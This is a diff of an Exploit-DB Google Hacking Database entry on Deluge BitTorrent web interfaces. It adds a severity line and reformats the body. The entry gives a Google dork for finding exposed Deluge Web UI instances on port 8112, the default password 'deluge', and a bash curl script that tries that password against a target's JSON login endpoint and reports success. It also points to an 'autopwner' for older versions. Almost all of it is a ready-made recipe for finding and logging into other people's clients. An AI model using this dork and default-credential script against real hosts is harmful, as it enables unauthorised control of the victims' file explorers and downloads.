@@ -1,4 +1,5 @@
 GHDB URL:         https://www.exploit-db.com/ghdb/4742
+Severity: 5 
 Category:         Files Containing Juicy Info
 Published Date:   2018-04-03
 Author:           Pancaker
@@ -6,4 +7,35 @@ GoogleDork:       Deluge - Web UI (BitTorrent Client - Download/Upload/Seed/Cont
 Description:      Deluge - Web UI (BitTorrent Client - Download/Upload/Seed/Control/File Explorer) v3
 
 
-GoogleDork v3 ~ intitle:"Deluge: Web UI" inurl:":8112"   Default password: `deluge` ~ https://dev.deluge-torrent.org/wiki/UserGuide/ThinClient#ClientSetup1 Default port: `8112` ~ https://dev.deluge-torrent.org/wiki/UserGuide/ThinClient#ClientSetup1   - - -   ## Bash  ``` url="http://target.com:8112/json" pass="deluge"  req=$( curl -s "${url}" \ -H 'Content-Type: application/json' \ --data-binary '{"method":"auth.login","params":["'${pass}'"],"id":1}' \ --compressed )  echo ${req} | grep -q '"result": true' \ &amp;&amp; echo 'w000h000!' \ || echo 'b00' ```  - - -   ## Other Work  - ruTorrent ~ https://www.exploit-db.com/ghdb/4652/ - Deluge v1+v2 (+autopwner) ~ https://www.exploit-db.com/ghdb/4741/ - Deluge v3 ~ https://www.exploit-db.com/ghdb/4742/ 
+GoogleDork v3 ~ intitle:"Deluge: Web UI" inurl:":8112" 
+ 
+ Default password: `deluge` ~ https://dev.deluge-torrent.org/wiki/UserGuide/ThinClient#ClientSetup1
+ Default port: `8112` ~ https://dev.deluge-torrent.org/wiki/UserGuide/ThinClient#ClientSetup1
+ 
+ 
+ - - - 
+ 
+ ## Bash
+ 
+ ```
+ url="http://target.com:8112/json"
+ pass="deluge"
+ 
+ req=$( curl -s "${url}" \
+ -H 'Content-Type: application/json' \
+ --data-binary '{"method":"auth.login","params":["'${pass}'"],"id":1}' \
+ --compressed )
+ 
+ echo ${req} | grep -q '"result": true' \
+ && echo 'w000h000!' \
+ || echo 'b00'
+ ```
+ 
+ - - - 
+ 
+ ## Other Work
+ 
+ - ruTorrent ~ https://www.exploit-db.com/ghdb/4652/
+ - Deluge v1+v2 (+autopwner) ~ https://www.exploit-db.com/ghdb/4741/
+ - Deluge v3 ~ https://www.exploit-db.com/ghdb/4742/
+ 
